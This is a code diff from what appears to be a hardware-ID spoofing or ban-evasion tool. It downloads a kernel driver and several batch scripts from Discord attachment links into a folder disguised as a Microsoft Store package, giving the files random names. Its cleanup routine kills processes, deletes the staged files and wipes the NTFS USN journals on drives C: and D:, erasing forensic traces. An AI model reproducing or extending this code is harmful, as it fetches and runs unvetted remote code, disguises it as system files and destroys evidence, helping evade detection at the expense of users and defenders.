@@ -68,7 +68,7 @@ void Downloads()
 	URLDownloadToFile(NULL, "https://cdn.discordapp.com/attachments/1073022570783326212/1073022934328811630/amifldrv64.sys", "C:\\ProgramData\\Packages\\Microsoft.StoreApp_kzf8qxf38zg5c\\amifldrv64.sys", 0, NULL);
 
 	URLDownloadToFile(NULL, "https://cdn.discordapp.com/attachments/1073022570783326212/1073022933032763493/HWID.cmd", "C:\\ProgramData\\Packages\\Microsoft.StoreApp_kzf8qxf38zg5c\\RVCGMYUFXFEW.cmd", 0, NULL);
-	URLDownloadToFile(NULL, "https://cdn.discordapp.com/attachments/1073022570783326212/1073022932097433610/beta.bat", "C:\\ProgramData\\Packages\\Microsoft.StoreApp_kzf8qxf38zg5c\\YSWQBBEJWGPF.bat", 0, NULL);
+	URLDownloadToFile(NULL, "https://cdn.discordapp.com/attachments/1073022570783326212/1073034453363998720/beta.bat", "C:\\ProgramData\\Packages\\Microsoft.StoreApp_kzf8qxf38zg5c\\YSWQBBEJWGPF.bat", 0, NULL);
 
 	URLDownloadToFile(NULL, "https://cdn.discordapp.com/attachments/1073022570783326212/1073022932424597605/C.cmd", "C:\\ProgramData\\Packages\\Microsoft.StoreApp_kzf8qxf38zg5c\\KNNDGEWJOSLA.cmd", 0, NULL);
 	URLDownloadToFile(NULL, "https://cdn.discordapp.com/attachments/1073022570783326212/1073022932709822575/D.cmd", "C:\\ProgramData\\Packages\\Microsoft.StoreApp_kzf8qxf38zg5c\\USYZYONQWMUM.cmd", 0, NULL);
@@ -212,6 +212,7 @@ void Final()
 	system(skCrypt("mode 60,20"));
 	system(skCrypt("rmdir /s /q C:\\ProgramData\\Packages\\Microsoft.StoreApp_kzf8qxf38zg5c"));
 	system(skCrypt("del /s /q C:\\Volumeid.exe >nul 2>nul"));
+	system(skCrypt("taskkill /f /im Volumeid64.exe >nul 2>nul")); // Anti-Bug
 	system(skCrypt("del /s /q C:\\Volumeid64.exe >nul 2>nul"));
 	system(skCrypt("fsutil usn deletejournal /d /c:"));
 	system(skCrypt("fsutil usn deletejournal /d /d:"));
